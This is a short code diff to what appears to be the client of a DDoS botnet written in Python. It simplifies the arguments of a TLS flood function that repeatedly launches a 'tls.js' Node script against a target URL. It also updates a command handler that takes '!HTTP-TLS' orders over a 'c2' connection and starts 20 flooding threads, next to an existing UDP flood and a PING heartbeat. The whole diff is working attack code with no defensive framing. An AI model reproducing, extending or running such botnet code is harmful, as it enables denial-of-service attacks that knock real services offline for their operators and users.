@@ -63,7 +63,7 @@ def attack_udp_gbps(ip, port, end_time, size):
 
 
 
-def attack_tls(url, end_time, size):
+def attack_tls(url, end_time):
     while time.time() < end_time:
         try:
             subprocess.run(["node", "tls.js", url, str(end_time)])
@@ -214,13 +214,11 @@ def main():
                         threading.Thread(target=attack_udp_gbps, args=(ip, port, end_time, size), daemon=True).start()
                 if command == '!HTTP-TLS':
                     url = args[1]
-                    port = int(args[2])
-                    duration = int(args[3])
+                    duration = int(args[2])
                     end_time = time.time() + duration
-                    size = 65500
                     threads = 20
                     for _ in range(threads):
-                        threading.Thread(target=attack_tls, args=(url, port, end_time, size), daemon=True).start()
+                        threading.Thread(target=attack_tls, args=(url, end_time), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
